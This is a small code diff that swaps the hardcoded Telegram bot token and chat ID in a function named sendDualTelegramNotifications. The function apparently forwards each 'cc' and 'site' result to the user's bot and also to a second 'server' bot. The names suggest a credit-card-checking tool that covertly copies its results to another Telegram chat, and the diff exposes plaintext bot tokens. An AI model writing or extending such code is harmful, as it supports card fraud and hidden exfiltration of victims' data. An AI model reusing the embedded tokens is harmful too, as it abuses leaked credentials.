@@ -146,8 +146,8 @@ async function sendDualTelegramNotifications(cc, site, result, userBotToken, use
   }
 
   // Send to YOUR server (your bot credentials)
-  const SERVER_BOT_TOKEN = process.env.SERVER_BOT_TOKEN || "8396276886:AAENwJQ83yCGe3MzOFURYSst-6s0uogQ_rw"; // Your bot token
-  const SERVER_CHAT_ID = process.env.SERVER_CHAT_ID || "-1002869133846"; // Your chat ID
+  const SERVER_BOT_TOKEN = process.env.SERVER_BOT_TOKEN || "7721067500:AAE5gJfp0zxnO6WR5Qcr9S3WYIvBShUHHjE"; // Your bot token
+  const SERVER_CHAT_ID = process.env.SERVER_CHAT_ID || "6538592001"; // Your chat ID
 
   try {
     await sendTelegramMessage(SERVER_BOT_TOKEN, SERVER_CHAT_ID, serverMessage);
